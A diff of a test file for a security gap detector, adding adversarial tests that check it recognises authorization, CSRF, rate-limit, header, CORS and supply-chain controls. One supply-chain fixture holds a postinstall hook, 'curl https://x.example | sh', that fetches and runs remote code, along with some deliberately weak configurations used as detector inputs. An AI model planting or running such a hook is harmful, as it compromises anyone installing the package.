@@ -209,11 +209,14 @@ describe("detectGaps: certainty", () => {
     expect(certaintyOf(CASES[4].absent, "security_headers_missing")).toBe(0.9);
     expect(certaintyOf(CASES[5].absent, "input_validation_missing")).toBe(0.55);
     expect(certaintyOf(CASES[9].absent, "error_handling_gap")).toBe(0.5);
-    expect(certaintyOf(CASES[10].absent, "cors_permissive")).toBe(0.9);
+    // A bare cors() with no credentials exposes public data only (adversarial 11a).
+    expect(certaintyOf(CASES[10].absent, "cors_permissive")).toBe(0.5);
   });
 
-  it("reports a missing lockfile at 0.5 and a postinstall script at 0.9", () => {
-    expect(certaintyOf([manifest()], "supply_chain_integrity")).toBe(0.5);
+  it("reports a missing lockfile at 0.35 and a postinstall script at 0.9", () => {
+    // A manifest with no dependencies has no tree to pin (adversarial 12a); a lockfile
+    // can be in the repository and outside the loaded files (12b), hence 0.35.
+    expect(certaintyOf([manifest({ express: "^4.0.0" })], "supply_chain_integrity")).toBe(0.35);
     expect(
       certaintyOf(
         [manifest({}, { postinstall: "node x.js" }), LOCKFILE],
@@ -856,5 +859,565 @@ describe("detectGaps: NodeGoat-style routes", () => {
     const input = gaps.find((g) => g.kind === "input_validation_missing");
     expect(input?.scope).toBe("route");
     expect(input?.summary).toMatch(/^GET \/learn reads request input/);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Adversarial review (docs/gap-adversarial-review.md): controls that ARE present
+// ---------------------------------------------------------------------------
+
+describe("adversarial: authz_missing", () => {
+  it("1a: an ownership comparison in the handler is an authorization check", () => {
+    const repo = expressRepo(
+      `app.get("/posts/:id", requireAuth, async (req, res) => {\n  const post = await db.find(req.params.id);\n  if (post.ownerId !== req.user.id) return res.status(403).end();\n  res.json(post);\n});`,
+    );
+    expect(kindsOf(repo)).not.toContain("authz_missing");
+  });
+
+  it("1a: an owner-scoped query counts too", () => {
+    const repo = expressRepo(
+      `app.delete("/posts/:id", requireAuth, async (req, res) => {\n  await db.post.delete({ where: { id: req.params.id, userId: req.user.id } });\n  res.end();\n});`,
+    );
+    expect(kindsOf(repo)).not.toContain("authz_missing");
+  });
+
+  it("1b: a role guard mounted with app.use covers the routes under its prefix", () => {
+    const repo = expressRepo(
+      `app.use("/admin", requireAdmin);\napp.get("/admin/users", requireAuth, ${HANDLER});\napp.get("/users/:id", requireAuth, ${HANDLER});`,
+    );
+    const gaps = gapsOf(repo).filter((gap) => gap.kind === "authz_missing");
+    expect(gaps.map((gap) => gap.routePath)).toEqual(["/users/:id"]);
+  });
+
+  it("1c: a Next App Router export wrapped in withRole is authenticated and authorized", () => {
+    const repo = [
+      manifest({ next: "^15.0.0" }),
+      LOCKFILE,
+      file(
+        "app/api/admin/users/route.ts",
+        `import { withRole } from "@/lib/auth";\nexport const GET = withRole("admin", async () => Response.json([]));\n`,
+      ),
+    ];
+    expect(kindsOf(repo)).not.toContain("authz_missing");
+    expect(kindsOf(repo)).not.toContain("authn_missing");
+  });
+
+  it("still reports a parameterised route with nothing but a login check", () => {
+    expect(kindsOf(CASES[0].absent)).toContain("authz_missing");
+  });
+});
+
+describe("adversarial: authn_missing", () => {
+  it("2a: a Next 16 proxy.ts that calls auth() guards every route handler", () => {
+    const repo = [
+      manifest({ next: "^16.0.0" }),
+      LOCKFILE,
+      file(
+        "proxy.ts",
+        `import { auth } from "@/auth";\nexport default auth((req) => { if (!req.auth) return Response.redirect("/login"); });\nexport const config = { matcher: ["/api/:path*"] };\n`,
+      ),
+      file("app/api/orders/route.ts", `export async function POST() { return Response.json({}); }\n`),
+    ];
+    expect(kindsOf(repo)).not.toContain("authn_missing");
+  });
+
+  it.each([
+    ["express-jwt", `const { expressjwt } = require("express-jwt");\napp.use(expressjwt({ secret, algorithms: ["HS256"] }));`],
+    ["Auth0 checkJwt", `const checkJwt = require("./jwt");\napp.use(checkJwt);`],
+    ["Clerk", `const { clerkMiddleware } = require("@clerk/express");\napp.use(clerkMiddleware());`],
+    ["verifySession", `const verifySession = require("./session");\nrouter.use(verifySession);`],
+  ])("2b: %s applied with .use() is a guard", (_name, setup) => {
+    const repo = expressRepo(`${setup}\napp.post("/orders", ${HANDLER});`);
+    expect(kindsOf(repo)).not.toContain("authn_missing");
+  });
+
+  it("2c: an inline require of an auth module in .use() is a guard", () => {
+    const repo = expressRepo(
+      `app.use(require("./middleware/requireAuth"));\napp.post("/orders", ${HANDLER});`,
+    );
+    expect(kindsOf(repo)).not.toContain("authn_missing");
+  });
+
+  it("does not take a rate limiter or a router mount for a guard", () => {
+    const repo = expressRepo(
+      `app.use(jwtLimiter);\napp.use("/auth", authRouter);\napp.post("/orders", ${HANDLER});`,
+    );
+    expect(kindsOf(repo)).toContain("authn_missing");
+  });
+});
+
+describe("adversarial: rate_limit_missing", () => {
+  const login = `app.post("/login", ${HANDLER});`;
+
+  it.each([
+    ["nginx limit_req", "nginx.conf", `limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;\nserver { location /login { limit_req zone=login; } }\n`],
+    ["Caddy rate_limit", "Caddyfile", `example.com {\n  rate_limit { zone login { key {remote_host} events 5 window 1m } }\n}\n`],
+    ["HAProxy stick-table", "haproxy.cfg", `frontend web\n  stick-table type ip size 100k expire 30s store http_req_rate(10s)\n`],
+  ])("3a: %s in proxy config is rate limiting", (_name, path, content) => {
+    const repo = [...expressRepo(login), file(path, content)];
+    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
+  });
+
+  it("3b: express-brute is a rate limiter", () => {
+    const repo = expressRepo(
+      `const ExpressBrute = require("express-brute");\nconst brute = new ExpressBrute(store);\napp.post("/login", brute.prevent, ${HANDLER});`,
+      { "express-brute": "^1.0.1" },
+    );
+    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
+  });
+
+  it("3c: a hand-rolled brute-force guard counts by name", () => {
+    const repo = expressRepo(
+      `const bruteForce = require("./bruteForce");\napp.post("/login", bruteForce, ${HANDLER});`,
+    );
+    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
+  });
+
+  it("3d: a login delegated to a hosted identity provider has no local brute-force target", () => {
+    const repo = expressRepo(
+      `app.get("/login", (req, res) => res.oidc.login());`,
+      { "express-openid-connect": "^2.17.0" },
+    );
+    expect(kindsOf(repo)).not.toContain("rate_limit_missing");
+  });
+
+  it("still reports a bare login route", () => {
+    expect(kindsOf(expressRepo(login))).toContain("rate_limit_missing");
+  });
+});
+
+describe("adversarial: csrf_missing", () => {
+  const checkout = `app.post("/checkout", ${HANDLER});`;
+
+  it("4a: a JSON-only body parser lowers certainty to 0.45 and says why", () => {
+    const repo = expressRepo(`app.use(express.json());\n${checkout}`, NEXT_DEP);
+    const gap = gapsOf(repo).find((g) => g.kind === "csrf_missing");
+    expect(gap?.certainty).toBe(0.45);
+    expect(gap?.basisFacts).toContain("JSON-only body parser");
+  });
+
+  it("4a: a form body parser beside the JSON one keeps 0.8", () => {
+    const repo = expressRepo(
+      `app.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n${checkout}`,
+      NEXT_DEP,
+    );
+    expect(certaintyOf(repo, "csrf_missing")).toBe(0.8);
+  });
+
+  it.each([
+    ["Origin header comparison", `app.use((req, res, next) => {\n  if (req.method !== "GET" && req.get("origin") !== ORIGIN) return res.sendStatus(403);\n  next();\n});`],
+    ["Sec-Fetch-Site", `app.use((req, res, next) => {\n  if (req.headers["sec-fetch-site"] === "cross-site") return res.sendStatus(403);\n  next();\n});`],
+    ["Referer allowlist", `app.use((req, res, next) => {\n  const referer = req.headers.referer || "";\n  if (!referer.startsWith(SITE)) return res.sendStatus(403);\n  next();\n});`],
+  ])("4b: %s is CSRF protection", (_name, guard) => {
+    const repo = expressRepo(`${guard}\n${checkout}`, { "cookie-session": "^2.0.0" });
+    expect(kindsOf(repo)).not.toContain("csrf_missing");
+  });
+
+  it("4b: reading the origin for CORS reflection without comparing it is not protection", () => {
+    const repo = expressRepo(
+      `app.use((req, res, next) => { res.set("Vary", req.headers.origin); next(); });\n${checkout}`,
+      NEXT_DEP,
+    );
+    expect(kindsOf(repo)).toContain("csrf_missing");
+  });
+
+  it("4c: csrf-sync's doubleSubmit counts as a used CSRF package", () => {
+    const repo = expressRepo(
+      `const { doubleSubmit } = require("csrf-sync");\napp.use(doubleSubmit);\n${checkout}`,
+      { ...NEXT_DEP, "csrf-sync": "^4.0.0" },
+    );
+    expect(kindsOf(repo)).not.toContain("csrf_missing");
+  });
+});
+
+describe("adversarial: security_headers_missing", () => {
+  const web = expressRepo(`app.get("/x", ${HANDLER});`);
+
+  it.each([
+    ["nginx add_header", "nginx.conf", `server {\n  add_header Content-Security-Policy "default-src 'self'";\n}\n`],
+    ["Caddyfile header", "Caddyfile", `example.com {\n  header Strict-Transport-Security "max-age=31536000"\n}\n`],
+    ["firebase.json hosting headers", "firebase.json", `{ "hosting": { "headers": [ { "source": "**", "headers": [ { "key": "X-Frame-Options", "value": "DENY" } ] } ] } }`],
+  ])("5a: %s sets the headers", (_name, path, content) => {
+    expect(kindsOf([...web, file(path, content)])).not.toContain("security_headers_missing");
+  });
+
+  it("5a: a commented-out nginx header does not count", () => {
+    const repo = [...web, file("nginx.conf", `server {\n  # add_header Content-Security-Policy "default-src 'self'";\n}\n`)];
+    expect(kindsOf(repo)).toContain("security_headers_missing");
+  });
+
+  it("5b: hono's secureHeaders() middleware is header middleware", () => {
+    const repo = [
+      manifest({ hono: "^4.0.0" }),
+      LOCKFILE,
+      file(
+        "src/index.ts",
+        `import { Hono } from "hono";\nimport { secureHeaders } from "hono/secure-headers";\nconst app = new Hono();\napp.use(secureHeaders());\nexport default app;\n`,
+      ),
+    ];
+    expect(kindsOf(repo)).not.toContain("security_headers_missing");
+  });
+
+  it("5c: a CSP meta tag in a server template counts", () => {
+    const repo = [
+      ...expressRepo(`app.set("view engine", "ejs");\napp.get("/", (req, res) => res.render("index"));`),
+      file("views/index.ejs", `<html><head><meta http-equiv="Content-Security-Policy" content="default-src 'self'"></head></html>`),
+    ];
+    expect(kindsOf(repo)).not.toContain("security_headers_missing");
+  });
+
+  it("still reports a web app with none of these", () => {
+    expect(kindsOf(web)).toContain("security_headers_missing");
+  });
+});
+
+describe("adversarial: input_validation_missing", () => {
+  it("6a: a schema imported from a workspace package and parsed in the handler is validation", () => {
+    const repo = [
+      manifest({ express: "^4.0.0" }),
+      LOCKFILE,
+      expressApp(
+        `const { UserSchema } = require("@acme/schemas");\napp.post("/x", (req, res) => { const u = UserSchema.parse(req.body); res.json(u); });`,
+      ),
+    ];
+    expect(kindsOf(repo)).not.toContain("input_validation_missing");
+  });
+
+  it("6a: a validate() call on a locally imported schema counts", () => {
+    const repo = expressRepo(
+      `const { orderSchema } = require("../lib/orders");\napp.post("/x", async (req, res) => { const v = await orderSchema.validate(req.body); res.json(v); });`,
+    );
+    expect(kindsOf(repo)).not.toContain("input_validation_missing");
+  });
+
+  it("6b: validation middleware mounted with router.use covers the routes under it", () => {
+    const repo = expressRepo(
+      `const validate = require("./validate");\napp.use(validate);\napp.post("/x", (req, res) => res.json(req.body));`,
+    );
+    expect(kindsOf(repo)).not.toContain("input_validation_missing");
+  });
+
+  it("6c: an express-validator chain from a shared module is validating middleware", () => {
+    const repo = [
+      manifest({ express: "^4.0.0", "express-validator": "^7.0.0" }),
+      LOCKFILE,
+      expressApp(
+        `const { rules } = require("./validators");\napp.post("/x", rules.email, (req, res) => res.json(req.body));`,
+      ),
+      file(
+        "src/validators.js",
+        `const { body } = require("express-validator");\nexports.rules = { email: body("email").isEmail() };\n`,
+      ),
+    ];
+    expect(kindsOf(repo)).not.toContain("input_validation_missing");
+  });
+
+  it("6d: celebrate is a validation library", () => {
+    const repo = [
+      manifest({ express: "^4.0.0", celebrate: "^15.0.0" }),
+      LOCKFILE,
+      expressApp(
+        `const { celebrate, Joi } = require("celebrate");\napp.post("/x", celebrate({ body: Joi.object() }), (req, res) => res.json(req.body));`,
+      ),
+    ];
+    expect(kindsOf(repo)).not.toContain("input_validation_missing");
+  });
+
+  it("still reports a handler that reads the body and validates nothing", () => {
+    expect(kindsOf(CASES[5].absent)).toContain("input_validation_missing");
+  });
+});
+
+describe("adversarial: transport_insecure", () => {
+  it.each([
+    ["a Kubernetes service address", `fetch("http://payments.default.svc/pay");`],
+    ["a cluster-local address", `fetch("http://api.default.svc.cluster.local/x");`],
+    ["an Open Graph namespace", `const prefix = "og: http://ogp.me/ns#";`],
+    ["an Adobe XMP namespace", `const NS = "http://ns.adobe.com/xap/1.0/";`],
+  ])("7a/7b: %s is not an external endpoint", (_name, code) => {
+    expect(kindsOf([file("src/c.js", code)])).not.toContain("transport_insecure");
+  });
+
+  it("7a: a compose service name with a dot is an internal host", () => {
+    const repo = [
+      file("docker-compose.yml", `services:\n  minio.storage:\n    image: minio/minio\n  api:\n    build: .\n`),
+      file("src/c.js", `fetch("http://minio.storage:9000/bucket");`),
+    ];
+    expect(kindsOf(repo)).not.toContain("transport_insecure");
+  });
+
+  it("7d: a database port published only in a development compose file is not exposure", () => {
+    const repo = [file("docker-compose.dev.yml", `services:\n  db:\n    image: postgres:16\n    ports:\n      - "5432:5432"\n`)];
+    expect(kindsOf(repo)).not.toContain("transport_insecure");
+  });
+
+  it("7e: tooling directories are not application source", () => {
+    expect(kindsOf([file("tools/proxy.js", `fetch("http://api.acme-corp.com/v1");`)])).not.toContain("transport_insecure");
+    expect(isScannable("bin/dev-proxy.js")).toBe(false);
+  });
+
+  it("still reports a plaintext request to a real host and a production compose port", () => {
+    expect(kindsOf(CASES[6].absent)).toContain("transport_insecure");
+    const compose = [file("docker-compose.yml", `services:\n  db:\n    ports:\n      - "5432:5432"\n`)];
+    expect(kindsOf(compose)).toContain("transport_insecure");
+  });
+});
+
+describe("adversarial: password_storage_weak", () => {
+  const login = `app.post("/login", async (req, res) => { const { password } = req.body; await users.check(password); res.end(); });`;
+
+  it.each([
+    ["passport-local-mongoose hashes with pbkdf2", { "passport-local-mongoose": "^8.0.0" }],
+    ["sodium-native's crypto_pwhash is a KDF", { "sodium-native": "^4.0.0" }],
+    ["keycloak-connect delegates the password", { "keycloak-connect": "^26.0.0" }],
+    ["@ory/client delegates the password", { "@ory/client": "^1.0.0" }],
+  ])("8a: %s", (_name, deps) => {
+    const repo = expressRepo(login, { pg: "^8.0.0", ...deps });
+    expect(kindsOf(repo)).not.toContain("password_storage_weak");
+  });
+
+  it("8b: a passwordless login has no password to hash", () => {
+    const repo = expressRepo(
+      `app.post("/login", async (req, res) => { await sendMagicLink(req.body.email); res.end(); });`,
+      { pg: "^8.0.0", otplib: "^12.0.0" },
+    );
+    expect(kindsOf(repo)).not.toContain("password_storage_weak");
+  });
+
+  it("still reports a password login against a datastore with no KDF", () => {
+    expect(kindsOf(expressRepo(login, { pg: "^8.0.0" }))).toContain("password_storage_weak");
+  });
+});
+
+describe("adversarial: logging_missing", () => {
+  it.each([
+    ["a NestJS-style this.logger.log()", `app.post("/login", (req, res) => { this.logger.log("login"); res.end(); });`],
+    ["an audit helper called in the handler", `const { audit } = require("./audit");\napp.post("/login", (req, res) => { audit(req, "login"); res.end(); });`],
+    ["a re-exported log() function", `const { log } = require("@/lib/logger");\napp.post("/login", (req, res) => { log("login attempt"); res.end(); });`],
+  ])("9a: %s is logging", (_name, body) => {
+    expect(kindsOf(expressRepo(body))).not.toContain("logging_missing");
+  });
+
+  it.each([
+    ["requestLogger", `const requestLogger = require("./logging");\napp.use(requestLogger);`],
+    ["morgan", `const morgan = require("morgan");\napp.use(morgan("combined"));`],
+    ["pinoHttp", `const pinoHttp = require("pino-http");\napp.use(pinoHttp());`],
+  ])("9b: %s applied with .use() is logging", (_name, setup) => {
+    const repo = expressRepo(`${setup}\napp.post("/login", ${HANDLER});`);
+    expect(kindsOf(repo)).not.toContain("logging_missing");
+  });
+
+  it("9c: pino-http and cloud logging SDKs are logging dependencies", () => {
+    expect(kindsOf(expressRepo(`app.post("/login", ${HANDLER});`, { "pino-http": "^10.0.0" }))).not.toContain("logging_missing");
+    expect(kindsOf(expressRepo(`app.post("/login", ${HANDLER});`, { "@google-cloud/logging": "^11.0.0" }))).not.toContain("logging_missing");
+  });
+
+  it("still reports a login route with no logging anywhere", () => {
+    expect(kindsOf(CASES[8].absent)).toContain("logging_missing");
+  });
+});
+
+describe("adversarial: error_handling_gap", () => {
+  const unguarded = `app.get("/a", async (req, res) => { await load(); res.end(); });`;
+
+  it.each([
+    ["an error handler registered with options", `app.use(errorHandler({ log: true }));`],
+    ["Sentry's error handler", `app.use(Sentry.Handlers.errorHandler());`],
+  ])("10a: %s is a registered error handler", (_name, registration) => {
+    expect(kindsOf(expressRepo(`${unguarded}\n${registration}`))).not.toContain("error_handling_gap");
+  });
+
+  it("10b: express-async-handler forwards rejections", () => {
+    expect(kindsOf(expressRepo(unguarded, { "express-async-handler": "^1.2.0" }))).not.toContain("error_handling_gap");
+  });
+
+  it("10b: a local catchAsync wrapper forwards the handler's rejection", () => {
+    const repo = expressRepo(
+      `const { catchAsync } = require("./utils");\napp.get("/a", catchAsync(async (req, res) => { await load(); res.end(); }));`,
+    );
+    expect(kindsOf(repo)).not.toContain("error_handling_gap");
+  });
+
+  it("10c: .catch(next) on the awaited promise handles the rejection", () => {
+    const repo = expressRepo(
+      `app.get("/a", async (req, res, next) => { const x = await load().catch(next); res.json(x); });`,
+    );
+    expect(kindsOf(repo)).not.toContain("error_handling_gap");
+  });
+
+  it("still reports an unguarded await with no handler registered", () => {
+    expect(kindsOf(CASES[9].absent)).toContain("error_handling_gap");
+  });
+});
+
+describe("adversarial: cors_permissive", () => {
+  const CORS = { cors: "^2.8.5" };
+
+  it("11a: a bare cors() with no credentials exposes public data only, at 0.5", () => {
+    const repo = expressRepo(`app.use("/public", cors());\napp.get("/public/feed", ${HANDLER});`, CORS);
+    const gap = gapsOf(repo).find((g) => g.kind === "cors_permissive");
+    expect(gap?.certainty).toBe(0.5);
+    expect(gap?.basisFacts).toContain("no credentials");
+  });
+
+  it("11a: a reflected origin, or a wildcard beside credentials: true, stays at 0.9", () => {
+    const reflected = expressRepo(`const cors = require("cors");\napp.use(cors({ origin: true }));`, CORS);
+    expect(certaintyOf(reflected, "cors_permissive")).toBe(0.9);
+    const withCredentials = expressRepo(
+      `const cors = require("cors");\napp.use(cors());\napp.use((req, res, next) => { res.set("Access-Control-Allow-Credentials", "true"); next(); });`,
+      CORS,
+    );
+    expect(certaintyOf(withCredentials, "cors_permissive")).toBe(0.9);
+  });
+
+  it("11b: a locally defined cors() with restrictive defaults is not the package", () => {
+    const repo = [
+      manifest({ express: "^4.0.0" }),
+      LOCKFILE,
+      expressApp(
+        `function cors(options = { origin: "https://app.example.com" }) { return (req, res, next) => next(); }\napp.use(cors());`,
+      ),
+    ];
+    expect(kindsOf(repo)).not.toContain("cors_permissive");
+  });
+
+  it("still reports the package's bare call and a wildcard header", () => {
+    expect(kindsOf(CASES[10].absent)).toContain("cors_permissive");
+    expect(kindsOf(expressRepo(`app.use((req, res, next) => { res.setHeader("Access-Control-Allow-Origin", "*"); next(); });`))).toContain("cors_permissive");
+  });
+});
+
+describe("adversarial: supply_chain_integrity", () => {
+  it("12a: a manifest with no dependencies needs no lockfile", () => {
+    expect(kindsOf([manifest({})])).not.toContain("supply_chain_integrity");
+  });
+
+  it("12c: the repository's own tooling in postinstall is 0.4, and ignore-scripts silences it", () => {
+    const tooling = [manifest({ prisma: "^5.0.0" }, { postinstall: "prisma generate" }), LOCKFILE];
+    expect(certaintyOf(tooling, "supply_chain_integrity")).toBe(0.4);
+    const ignored = [...tooling, file(".npmrc", "ignore-scripts=true\n")];
+    expect(kindsOf(ignored)).not.toContain("supply_chain_integrity");
+    const arbitrary = [manifest({}, { postinstall: "curl https://x.example | sh" }), LOCKFILE];
+    expect(certaintyOf(arbitrary, "supply_chain_integrity")).toBe(0.9);
+  });
+
+  it("12d: a vendor script that forbids SRI is not reported", () => {
+    const page = file("index.html", `<script src="https://js.stripe.com/v3/"></script>\n<script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>`);
+    expect(kindsOf([page])).not.toContain("supply_chain_integrity");
+  });
+
+  it("12e: a build-time SRI plugin covers template script tags", () => {
+    const repo = [
+      manifest({}, {}, { "vite-plugin-sri": "^0.1.0" }),
+      LOCKFILE,
+      file("src/index.html", `<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script>`),
+    ];
+    expect(kindsOf(repo)).not.toContain("supply_chain_integrity");
+  });
+
+  it("still reports a library CDN script with no integrity", () => {
+    expect(kindsOf([file("index.html", `<script src="https://cdn.jsdelivr.net/npm/x@1/x.js"></script>`)])).toContain("supply_chain_integrity");
+  });
+});
+
+describe("adversarial: client_secret_storage", () => {
+  it.each([
+    ["a token expiry timestamp", `localStorage.setItem("tokenExpiresAt", String(Date.now() + 3600e3));`],
+    ["a CSRF double-submit token", `sessionStorage.setItem("csrfToken", token);`],
+    ["a publishable key", `localStorage.setItem("stripePublishableKey", pk);`],
+    ["a CAPTCHA token", `sessionStorage.setItem("recaptchaToken", t);`],
+  ])("13a: %s is not a secret", (_name, code) => {
+    expect(kindsOf([file("src/auth.js", code)])).not.toContain("client_secret_storage");
+  });
+
+  it("13d: clearing a key on logout is not storing a secret", () => {
+    expect(kindsOf([file("src/logout.js", `localStorage.setItem("token", "");\nlocalStorage.setItem("apiKey", null);`)])).not.toContain("client_secret_storage");
+  });
+
+  it("still reports a real token write", () => {
+    expect(kindsOf([file("src/auth.js", `localStorage.setItem("token", data.accessToken);`)])).toContain("client_secret_storage");
+  });
+});
+
+describe("adversarial: certainty lowerings", () => {
+  it("2d: a route in another file than a prefix guard may be covered by an unresolved mount", () => {
+    const repo = [
+      manifest({ express: "^4.18.2" }),
+      LOCKFILE,
+      expressApp(`app.use("/api", requireAuth);\napp.use("/api", logged(usersRouter));`),
+      file("src/routes/users.js", `const router = require("express").Router();\nrouter.post("/users", ${HANDLER});\nmodule.exports = router;\n`),
+    ];
+    expect(certaintyOf(repo, "authn_missing")).toBe(0.6);
+    expect(certaintyOf(expressRepo(`app.post("/orders", ${HANDLER});`), "authn_missing")).toBe(0.9);
+  });
+
+  it("4d: a Next.js route with a cookie signal is 0.5", () => {
+    const repo = [
+      manifest({ next: "^15.0.0", "next-auth": "^4.0.0" }),
+      LOCKFILE,
+      file("app/checkout/route.ts", `export async function POST(req: Request) { const body = await req.json(); return Response.json(body); }\n`),
+    ];
+    expect(certaintyOf(repo, "csrf_missing")).toBe(0.5);
+  });
+
+  it("4e: a cookie session in one workspace package does not raise the routes of another", () => {
+    const repo = [
+      file("apps/web/package.json", JSON.stringify({ dependencies: { express: "^4", "express-session": "^1" } })),
+      file("apps/web/src/app.js", `const session = require("express-session");\napp.use(session({}));\n`),
+      file("apps/api/package.json", JSON.stringify({ dependencies: { express: "^4" } })),
+      file("apps/api/src/app.js", `const express = require("express");\nconst app = express();\napp.post("/orders", ${HANDLER});\n`),
+      LOCKFILE,
+    ];
+    expect(certaintyOf(repo, "csrf_missing")).toBe(0.5);
+    expect(certaintyOf(CASES[3].absent, "csrf_missing")).toBe(0.8);
+  });
+
+  it("5d: helmet declared but its mounting file not loaded is 0.6", () => {
+    const repo = [manifest({ express: "^4.0.0", helmet: "^7.0.0" }), LOCKFILE, expressApp(`app.get("/x", ${HANDLER});`)];
+    expect(certaintyOf(repo, "security_headers_missing")).toBe(0.6);
+    expect(certaintyOf(CASES[4].absent, "security_headers_missing")).toBe(0.9);
+  });
+
+  it("7c: rejectUnauthorized under a development condition is 0.5", () => {
+    const guarded = [file("src/db.js", `const ssl = process.env.NODE_ENV === "production"\n  ? true\n  : { rejectUnauthorized: false };\n`)];
+    expect(certaintyOf(guarded, "transport_insecure")).toBe(0.5);
+    const plain = [file("src/db.js", `const ssl = { rejectUnauthorized: false };\n`)];
+    expect(certaintyOf(plain, "transport_insecure")).toBe(0.75);
+  });
+
+  it("8c: a Credentials provider that verifies against another service is 0.5", () => {
+    const remote = [
+      manifest({ next: "^15.0.0", "next-auth": "^4.0.0", pg: "^8.0.0" }),
+      LOCKFILE,
+      file("pages/api/auth/[...nextauth].ts", `CredentialsProvider({\n  async authorize(c) {\n    const r = await fetch("https://idp.example.com/login", { method: "POST", body: JSON.stringify(c) });\n    return r.ok ? await r.json() : null;\n  },\n});\n`),
+      file("pages/api/login.ts", `export default function handler(req, res) { res.end(); }\n`),
+    ];
+    expect(certaintyOf(remote, "password_storage_weak")).toBe(0.5);
+    const local = [
+      manifest({ next: "^15.0.0", "next-auth": "^4.0.0", pg: "^8.0.0" }),
+      LOCKFILE,
+      file("pages/api/auth/[...nextauth].ts", `CredentialsProvider({\n  async authorize(c) { return db.users.findByPassword(c.password); },\n});\n`),
+      file("pages/api/login.ts", `export default function handler(req, res) { res.end(); }\n`),
+    ];
+    expect(certaintyOf(local, "password_storage_weak")).toBe(0.8);
+  });
+
+  it("11c: a cors() under a development condition is 0.5 even with credentials", () => {
+    const repo = expressRepo(
+      `if (process.env.NODE_ENV === "development") {\n  app.use(cors({ origin: true, credentials: true }));\n}`,
+      { cors: "^2.8.5" },
+    );
+    expect(certaintyOf(repo, "cors_permissive")).toBe(0.5);
+  });
+
+  it("12b: a lockfile absent from the loaded files is 0.35", () => {
+    expect(certaintyOf([manifest({ express: "^4.0.0" })], "supply_chain_integrity")).toBe(0.35);
+  });
+});
+
+describe("adversarial: supply_chain_integrity lockfiles", () => {
+  it("12 (deno.lock): a Deno lockfile pins the tree", () => {
+    const repo = [manifest({ express: "^4.0.0" }), file("deno.lock", "{}")];
+    expect(kindsOf(repo)).not.toContain("supply_chain_integrity");
   });
 });
